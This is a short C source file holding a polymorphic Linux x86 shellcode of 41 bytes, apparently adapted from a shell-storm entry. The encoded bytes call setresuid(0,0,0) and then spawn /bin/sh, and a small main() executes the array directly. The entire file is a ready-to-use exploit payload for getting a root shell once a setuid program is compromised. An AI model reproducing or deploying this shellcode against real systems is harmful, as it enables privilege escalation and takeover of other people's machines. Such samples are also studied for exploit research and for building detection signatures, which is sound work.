// linux x86 setresuid(0,0,0)-/bin/sh
// Original Shellcode - 35 bytes: http://shell-storm.org/shellcode/files/shellcode-220.php
// Polymorphic Shellcode - 41 bytes
// Author: buffered4ever
// 15-03-2019

#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x29\xc0\x89\xc3\x31\xd9\x21\xc2\x04\xa5\x2c\x01\xcd\x80\x31\xc0\xb0\x0a\x04\x01\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80";
main()

{
	printf("Shellcode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}

